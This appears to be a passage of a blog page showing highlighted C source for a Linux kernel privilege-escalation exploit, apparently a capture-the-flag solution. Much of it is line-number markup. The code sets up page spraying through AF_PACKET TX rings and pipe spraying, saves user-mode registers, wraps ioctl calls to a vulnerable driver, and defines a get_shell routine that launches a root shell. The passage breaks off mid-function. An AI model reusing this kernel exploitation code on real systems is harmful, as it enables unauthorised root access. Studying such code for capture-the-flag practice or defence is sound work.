class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_START_IDX 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_START_IDX 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">option</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x114</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x810</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x1919</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> *<span class="title">option</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct option));</span><br><span class="line">    option-&gt;idx = idx;</span><br><span class="line">    option-&gt;size = size;</span><br><span class="line">    option-&gt;buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x514</span>, option);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_nr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket_and_alloc_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">int</span> socket_fd, version;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,</span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        close(socket_fd);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_page</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">0</span>,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    